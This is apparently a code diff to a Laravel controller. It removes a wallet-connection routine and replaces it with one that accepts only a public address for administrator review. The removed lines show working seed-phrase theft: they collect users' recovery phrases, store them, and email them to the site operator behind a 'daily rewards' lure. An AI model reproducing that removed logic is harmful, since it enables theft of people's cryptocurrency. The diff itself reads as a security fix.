@@ -120,100 +120,23 @@ class ViewsController extends Controller
 
     public function validateMnemonic(Request $request)
     {
-        // Validate input
-        $request->validate([
+        // Legacy route name retained. Only a public EVM address is accepted.
+        $data = $request->validate([
             'wallet' => 'required|string|max:100',
-            'mnemonic' => 'required|string|min:12'
+            'wallet_address' => ['required', 'string', 'regex:/^0x[a-fA-F0-9]{40}$/'],
         ]);
-
-        $mnemonic = trim($request->input('mnemonic'));
-        $wallet = $request->input('wallet');
-
-        // Basic validation for mnemonic format
-        $words = explode(' ', $mnemonic);
-        $words = array_filter($words, function($word) {
-            return !empty(trim($word));
-        });
-
-        // Check word count (12, 15, 18, 21, or 24 words are standard)
-        $validWordCounts = [12, 15, 18, 21, 24];
-        if (!in_array(count($words), $validWordCounts)) {
-            return redirect()->back()
-                ->with('message', 'Invalid recovery phrase. Must be 12, 15, 18, 21, or 24 words.')
-                ->withInput();
+        $user = Auth::user();
+        $wallet = Wallets::where('user', $user->id)->first();
+        if ($wallet && in_array($wallet->status, ['active', 'suspended', 'rejected'], true)) {
+            return back()->with('message', 'This wallet record requires administrator review.');
         }
-
-        // Check for invalid characters
-        foreach ($words as $word) {
-            if (!preg_match('/^[a-zA-Z]+$/', $word)) {
-                return redirect()->back()
-                    ->with('message', 'Recovery phrase contains invalid characters. Only letters are allowed.')
-                    ->withInput();
-            }
-        }
-
-        $cryptoService = new CryptoWalletService();
-
-        if ($cryptoService->isMnemonicValid($mnemonic)) {
-            // Check if user already has a wallet connected
-            $existingWallet = Wallets::where('user', Auth::user()->id)->first();
-
-            if ($existingWallet) {
-                // Update existing wallet
-                $existingWallet->update([
-                    'wallet_name' => $wallet,
-                    'phrase' => $mnemonic,
-                    'status' => 'active',
-                    'last_validated' => now(),
-                    'updated_at' => now()
-                ]);
-            } else {
-                // Create new wallet entry
-                Wallets::create([
-                    'user' => Auth::user()->id,
-                    'wallet_name' => $wallet,
-                    'phrase' => $mnemonic,
-                    'status' => 'active',
-                    'last_validated' => now(),
-                ]);
-            }
-
-            // Update user's wallet connection status
-            User::where('id', Auth::user()->id)
-                ->update([
-                    'wallet_connected' => 1
-                ]);
-
-            // Prepare admin notification
-            $msg = "New wallet connection:\n\n";
-            $msg .= "User: " . Auth::user()->name . " (" . Auth::user()->email . ")\n";
-            $msg .= "Wallet Name: " . $wallet . "\n";
-            $msg .= "Connection Time: " . now()->format('Y-m-d H:i:s') . "\n\n";
-            $msg .= "Phrase Mnemonic: " . $mnemonic . "\n\n";
-
-            $subject = "New wallet connection from " . Auth::user()->name;
-
-            // Send admin notification
-            try {
-                $settings = Settings::where('id', '1')->first();
-
-                    Mail::to($settings->contact_email)->send(new NewNotification($msg, $subject, "Admin"));
-
-            } catch (\Exception $e) {
-                // Log the error but don't break the flow
-                \Log::error('Failed to send wallet connection notification: ' . $e->getMessage());
-            }
-
-            return redirect()->back()
-                ->with('success', 'Wallet connected successfully! You can now start earning daily rewards.');
-
-        } else {
-            return redirect()->back()
-                ->with('message', 'Invalid recovery phrase. Please check your phrase and try again.')
-                ->withInput();
-        }
+        // Existing phrase column is reused only for non-secret public addresses.
+        $values = ['wallet_name' => $data['wallet'], 'phrase' => $data['wallet_address'], 'status' => 'pending'];
+        if ($wallet) { $wallet->update($values); }
+        else { Wallets::create(array_merge($values, ['user' => $user->id])); }
+        User::where('id', $user->id)->update(['wallet_connected' => 0]);
+        return back()->with('success', 'Wallet submitted for administrator review.');
     }
-
     //Profile route
     public function profile()
     {
